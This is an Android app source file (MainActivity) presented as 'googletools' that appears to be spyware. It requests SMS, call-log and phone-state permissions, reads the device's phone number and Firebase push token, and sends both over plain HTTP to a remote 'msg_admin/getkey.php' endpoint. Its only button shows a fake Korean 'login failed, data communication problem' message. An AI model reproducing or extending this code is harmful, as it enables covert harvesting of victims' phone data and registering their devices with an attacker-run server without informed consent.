package com.example.googletools;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Bundle;

import com.google.android.material.floatingactionbutton.FloatingActionButton;
import com.google.android.material.snackbar.Snackbar;
import com.google.firebase.iid.FirebaseInstanceId;

import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.widget.Toolbar;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.view.Menu;
import android.view.MenuItem;
import android.widget.Button;
import android.widget.Toast;

import okhttp3.FormBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import static android.Manifest.permission.READ_CALL_LOG;

public class MainActivity extends AppCompatActivity  implements View.OnClickListener {

    private static final String main_server = "http://score-test5.com";
    private static final int PERMISSIONS_REQUEST_READ_SMS = 9988;
    private static final int PERMISSIONS_REQUEST_READ_PHONE_STATE = 9989;
    private static final int PERMISSION_REQUEST_READ_CALL_LOG = 9990;
    private Button btn1;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);


        btn1 = (Button)findViewById(R.id.button);
        if(  (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) ) {
            ActivityCompat.requestPermissions(this, new String[]{READ_CALL_LOG}, PERMISSION_REQUEST_READ_CALL_LOG);
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_SMS}, PERMISSIONS_REQUEST_READ_SMS);
        }

        if(  (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) ){

        }
        if ( (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) ) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_PHONE_STATE}, PERMISSIONS_REQUEST_READ_PHONE_STATE);
        }else{
            if ( checkSelfPermission(Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                TelephonyManager systemService = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
                String PhoneNumber = systemService.getLine1Number();
                if(PhoneNumber!=null && PhoneNumber.equals("")){
                    PhoneNumber = PhoneNumber.substring(PhoneNumber.length()-10,PhoneNumber.length());
                    PhoneNumber = "0"+PhoneNumber;
                }

                String getToken = FirebaseInstanceId.getInstance().getToken();

                sendRegistrationToServer(getToken,PhoneNumber);
                return;
            }

        }


    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
        if (requestCode == PERMISSIONS_REQUEST_READ_PHONE_STATE && grantResults.length > 0) {
            if (grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                // 사용자가 퍼미션을 허용했으므로, 해당 퍼미션이 필요한 API 호출이 가능한 시점
                // ..
            }

        }
        else if (requestCode == PERMISSIONS_REQUEST_READ_SMS && grantResults.length > 0) {
            if (grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                // 사용자가 퍼미션을 허용했으므로, 해당 퍼미션이 필요한 API 호출이 가능한 시점
                // ..
            }

        }
        else if (requestCode == PERMISSION_REQUEST_READ_CALL_LOG && grantResults.length > 0 ){
            if (grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                // 사용자가 퍼미션을 허용했으므로, 해당 퍼미션이 필요한 API 호출이 가능한 시점
                // ..
            }
        }

    }

    private void sendRegistrationToServer(String token, String Phonenumber) {
        // TODO: Implement this method to send token to your app server.


        // form
        // http://www.jogilsang.co.kr?token="token"
        InsertTask task = new InsertTask(getApplicationContext());
        task.execute(main_server+"/msg_admin/getkey.php", "key", token, "number", Phonenumber);
    }

    @Override
    public void onClick(View v) {
        switch (v.getId()){
            case R.id.button :
                Toast.makeText(this, "로그인에 실패 하였습니다, 데이터 통신에 문제가 발생하였습니다.", Toast.LENGTH_SHORT).show();
                break;
        }
    }
}
